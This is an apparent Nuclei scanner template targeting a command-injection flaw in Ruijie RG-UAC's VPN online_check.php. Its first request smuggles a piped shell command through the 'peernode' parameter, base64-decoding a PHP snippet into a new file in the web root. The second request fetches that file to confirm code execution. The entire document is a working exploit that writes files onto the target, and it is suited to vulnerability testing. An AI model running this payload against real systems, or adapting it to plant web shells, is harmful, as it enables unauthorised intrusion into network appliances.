id: Ruijie-RG-UAC-peernode-rce
info:
  name: Ruijie-RG-UAC-peernode-rce
  author: lemonlove7
  severity: critical
flow: http(1) && http(2)
variables:
  randfile: "{{to_lower(rand_text_alpha(8))}}"

http:
  - raw:
      - |-
        GET /view/vpn/autovpn/online_check.php?peernode=%20|%20`echo%20PD9waHAgcGhwaW5mbygpOw==%20|%20base64%20-d%20%3E%20{{randfile}}.php` HTTP/1.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
    matchers:
      - type: status
        status:
          - 200
        internal: true
    matchers-condition: and

  - raw:
      - |-
        GET /view/vpn/autovpn/{{randfile}}.php HTTP/1.1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - PHP Version
    matchers-condition: and